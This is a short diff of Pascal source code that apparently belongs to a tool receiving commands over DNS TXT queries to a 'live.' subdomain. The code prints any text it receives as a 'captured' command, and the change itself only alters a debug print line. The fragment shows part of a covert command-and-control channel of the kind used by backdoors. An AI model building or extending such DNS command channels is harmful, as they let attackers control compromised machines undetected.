@@ -244,7 +244,7 @@ begin
   DNSd.TargetHost := i_host;
 
   if DNSd.DNSQuery('live.'+i_host, QTYPE_TXT, p2) then
-   writeln(length('[!] DNS Query Length: '+p2.text)); // length of accepted DNS query
+   writeln('[!] DNS Query Length: '+length(p2.text)); // length of accepted DNS query
    if length(p2.text) > 1 then
   writeln('[+] Yo! Command captured  <-'+p2.text);
    {$IFDEF Windows} // for windows env
